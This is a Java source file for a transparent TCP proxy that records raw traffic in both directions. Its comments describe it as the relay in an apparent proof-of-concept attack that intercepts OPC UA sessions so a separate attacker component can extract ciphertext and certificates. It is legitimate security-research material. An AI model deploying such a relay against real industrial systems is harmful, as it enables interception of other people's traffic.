package poc.common;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * A minimal transparent TCP proxy that records raw bytes in BOTH directions for later parsing.
 * Runs as its own process ({@code poc.RelayMain}) in this PoC's process-isolation design -- it
 * does no OPC UA/UASC parsing of its own; it hands the raw byte streams to whoever asks
 * ({@code poc.AttackerMain}), which is where the actual ciphertext/certificate extraction
 * happens. It never sees, needs, or forwards the victim's password.
 */
public final class TcpRecordingProxy {
  private static final Logger LOGGER = LoggerFactory.getLogger(TcpRecordingProxy.class);

  private final String targetHost;
  private final int targetPort;
  private ServerSocket serverSocket;
  private volatile int localPort;
  private final ConcurrentLinkedQueue<byte[]> clientToServer = new ConcurrentLinkedQueue<>();
  private final ConcurrentLinkedQueue<byte[]> serverToClient = new ConcurrentLinkedQueue<>();
  private final AtomicBoolean running = new AtomicBoolean(false);
  private Thread acceptThread;

  public TcpRecordingProxy(String targetHost, int targetPort) {
    this.targetHost = targetHost;
    this.targetPort = targetPort;
  }

  public int localPort() {
    return localPort;
  }

  public void start() throws Exception {
    serverSocket = new ServerSocket();
    serverSocket.bind(new InetSocketAddress("localhost", 0));
    localPort = serverSocket.getLocalPort();
    running.set(true);
    acceptThread =
        new Thread(
            () -> {
              while (running.get()) {
                try {
                  Socket client = serverSocket.accept();
                  handle(client);
                } catch (Exception ex) {
                  if (running.get()) {
                    LOGGER.debug("proxy accept ended: {}", ex.toString());
                  }
                  return;
                }
              }
            },
            "relay-accept");
    acceptThread.setDaemon(true);
    acceptThread.start();
    LOGGER.info(
        "Recording relay listening on localhost:{} -> {}:{}", localPort, targetHost, targetPort);
  }

  private void handle(Socket client) throws Exception {
    Socket upstream = new Socket(targetHost, targetPort);
    client.setTcpNoDelay(true);
    upstream.setTcpNoDelay(true);
    Thread t1 = new Thread(() -> pump(client, upstream, clientToServer), "relay-c2s-" + client.getPort());
    Thread t2 = new Thread(() -> pump(upstream, client, serverToClient), "relay-s2c-" + client.getPort());
    t1.setDaemon(true);
    t2.setDaemon(true);
    t1.start();
    t2.start();
    t1.join();
    t2.join();
  }

  private void pump(Socket in, Socket out, ConcurrentLinkedQueue<byte[]> recordSink) {
    byte[] buf = new byte[16384];
    try {
      InputStream is = in.getInputStream();
      OutputStream os = out.getOutputStream();
      int read;
      while ((read = is.read(buf)) != -1) {
        byte[] copy = new byte[read];
        System.arraycopy(buf, 0, copy, 0, read);
        recordSink.add(copy);
        os.write(buf, 0, read);
        os.flush();
      }
    } catch (Exception ex) {
      // connection closed
    } finally {
      try {
        out.shutdownOutput();
      } catch (Exception ignore) {
      }
    }
  }

  public byte[] recordedClientToServer() {
    return concat(clientToServer);
  }

  public byte[] recordedServerToClient() {
    return concat(serverToClient);
  }

  private static byte[] concat(ConcurrentLinkedQueue<byte[]> chunks) {
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    for (byte[] b : chunks) {
      bos.writeBytes(b);
    }
    return bos.toByteArray();
  }

  public void stop() {
    running.set(false);
    try {
      if (serverSocket != null) {
        serverSocket.close();
      }
    } catch (Exception ignore) {
    }
  }
}
